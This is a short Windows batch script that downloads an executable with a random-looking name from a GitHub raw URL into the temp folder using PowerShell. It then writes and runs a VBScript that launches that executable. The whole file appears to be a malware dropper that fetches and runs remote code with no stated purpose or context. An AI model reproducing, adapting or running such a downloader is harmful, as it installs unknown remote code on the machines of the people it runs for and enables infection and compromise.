@echo off

set url=https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe
set path=%TEMP%\fbf12e4f.exe
powershell -Command "Invoke-WebRequest %url% -OutFile %path%"
echo CreateObject("Shell.Application").ShellExecute "%TEMP%\fbf12e4f.exe","",",," > "%TEMP%\fbf12e4f.vbs"
"%TEMP%\fbf12e4f.vbs"
